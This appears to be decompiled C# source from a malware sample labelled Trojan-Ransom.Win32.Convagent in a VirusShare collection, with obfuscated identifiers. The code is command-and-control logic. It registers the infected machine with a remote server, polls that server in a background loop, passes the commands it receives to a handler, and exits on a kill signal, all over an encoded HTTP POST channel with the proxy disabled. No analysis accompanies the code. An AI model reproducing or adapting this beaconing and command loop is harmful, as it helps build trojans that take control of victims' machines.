// Decompiled with JetBrains decompiler
// Type: *p.;6
// Assembly: System, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DB18CA19-4EF7-467A-AA02-244B3B1B157A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\VHO-Trojan-Ransom.Win32.Convagent.gen-fe2473ff7e7507e98adf2d055102064f9ebc133096f412e3944dd0dbee2345d7.exe

using \u002Ap\u000C;
using \u002Ap\u000C.\u0019A\u0013\u001C\u000A\u000B.\u0016t;
using System;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;

namespace \u002Ap\u000C
{
  internal class \u001C\u0017\u003B6\u0012\u0016\u0008\u0002 : j\u0020
  {
    private static bool F\u0026\u002C\u0011\u0007 = false;
    private static string \u0001\u002D\u007C\u000B\u0005\u0001\u002A\u0002 = string.Empty;
    private static string \u003A\u0017\u0029L2 = ZC.\u001E\u0007NB();
    private static Thread \u000Dc\u0017W\u0003\u001AU\u003B = new Thread(new ThreadStart(\u001C\u0017\u003B6\u0012\u0016\u0008\u0002.\u000C\u0014E\u0026\u0027\u0010));

    public static void o\u000A\u0028()
    {
      \u001C\u0017\u003B6\u0012\u0016\u0008\u0002.\u0001\u002D\u007C\u000B\u0005\u0001\u002A\u0002 = string.Empty;
      \u001C\u0017\u003B6\u0012\u0016\u0008\u0002.\u0023\u0007\u000E\u005CV\u0005\u0029();
      \u001C\u0017\u003B6\u0012\u0016\u0008\u0002.O\u0017\u0007EM();
    }

    public static void O\u0017\u0007EM()
    {
      \u001C\u0017\u003B6\u0012\u0016\u0008\u0002.F\u0026\u002C\u0011\u0007 = true;
      \u001C\u0017\u003B6\u0012\u0016\u0008\u0002.\u000Dc\u0017W\u0003\u001AU\u003B.Start();
    }

    public static void QJ\u0002\u0013\u0005() => \u001C\u0017\u003B6\u0012\u0016\u0008\u0002.F\u0026\u002C\u0011\u0007 = false;

    private static void \u0023\u0007\u000E\u005CV\u0005\u0029()
    {
      string str1 = \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.FK\u000E\u000F\u0009\u0013\u000A() + \u0034\u002Dy\u0029\u000B\u0023.uI + \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0035\u000C\u00215\u002A\u007B\u0006\u008F() + \u001C\u0017\u003B6\u0012\u0016\u0008\u0002.\u003A\u0017\u0029L2 + \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.gJ() + \u0034\u002Dy\u0029\u000B\u0023.\u000C\u002EF\u000D\u002A\u0017.ToString() + \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0004\u0001\u002A`() + \u001AOk\u00245\u0023.\u0002\u000Ej\u0024\u0011\u003C().ToString();
      while (true)
      {
        try
        {
          string str2 = \u001C\u0017\u003B6\u0012\u0016\u0008\u0002.\u003Cd\u0011\u0008\u0012\u0012\u002D\u0086(\u0034\u002Dy\u0029\u000B\u0023.\u000D\u000F\u000D, str1);
          if (str2.Length > 0)
          {
            if (!(str2 != \u0034\u002Dy\u0029\u000B\u0023.\u00172\u0017\u000C\u001F\u000B\u003D))
              break;
            Environment.Exit(0);
          }
        }
        catch
        {
        }
        Thread.Sleep(\u0034\u002Dy\u0029\u000B\u0023.\u007D\u002F\u000D2V\u0002\u0012 * 1000);
      }
    }

    private static void \u000C\u0014E\u0026\u0027\u0010()
    {
      string str1 = \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0027\u000B\u0019\u0004d\u0024() + \u0034\u002Dy\u0029\u000B\u0023.uI + \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0004\u0001\u002A`();
      while (\u001C\u0017\u003B6\u0012\u0016\u0008\u0002.F\u0026\u002C\u0011\u0007)
      {
        try
        {
          string str2 = \u001C\u0017\u003B6\u0012\u0016\u0008\u0002.\u003Cd\u0011\u0008\u0012\u0012\u002D\u0086(\u0034\u002Dy\u0029\u000B\u0023.\u000D\u000F\u000D, str1 + \u001AOk\u00245\u0023.\u0002\u000Ej\u0024\u0011\u003C().ToString());
          if (str2.Length > 0)
          {
            if (str2 != \u001C\u0017\u003B6\u0012\u0016\u0008\u0002.\u0001\u002D\u007C\u000B\u0005\u0001\u002A\u0002)
            {
              \u001C\u0017\u003B6\u0012\u0016\u0008\u0002.\u0001\u002D\u007C\u000B\u0005\u0001\u002A\u0002 = str2;
              j\u0020.c\u0018\u0018(str2);
            }
          }
          else
          {
            \u0001\u0011.\u0019\u0008J\u0002\u0009\u0016();
            \u001C\u0017\u003B6\u0012\u0016\u0008\u0002.\u0001\u002D\u007C\u000B\u0005\u0001\u002A\u0002 = string.Empty;
          }
        }
        catch
        {
        }
        Thread.Sleep(\u0034\u002Dy\u0029\u000B\u0023.\u007D\u002F\u000D2V\u0002\u0012 * 1000);
      }
    }

    private static string \u003Cd\u0011\u0008\u0012\u0012\u002D\u0086(
      string _param0,
      string _param1)
    {
      ServicePointManager.Expect100Continue = false;
      \u001AOk\u00245\u0023.\u0004\u001D\u000Eh\u0008\u001F(ref _param1, \u0034\u002Dy\u0029\u000B\u0023.\u00172\u0017\u000C\u001F\u000B\u003D);
      byte[] bytes = Encoding.Default.GetBytes(_param1);
      HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(_param0);
      httpWebRequest.ContentType = \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0015\u0024\u000A\u0029\u0017\u0003\u0008();
      httpWebRequest.Method = \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0012\u0012\u0025\u00216\u0027();
      httpWebRequest.Proxy = (IWebProxy) null;
      httpWebRequest.ContentLength = (long) bytes.Length;
      using (Stream requestStream = httpWebRequest.GetRequestStream())
      {
        requestStream.Write(bytes, 0, bytes.Length);
        requestStream.Close();
      }
      WebResponse response = httpWebRequest.GetResponse();
      if (response == null)
        return string.Empty;
      string end = new StreamReader(response.GetResponseStream(), Encoding.Default, false).ReadToEnd();
      \u001AOk\u00245\u0023.\u0004\u001D\u000Eh\u0008\u001F(ref end, \u0034\u002Dy\u0029\u000B\u0023.\u00172\u0017\u000C\u001F\u000B\u003D);
      return end;
    }
  }
}
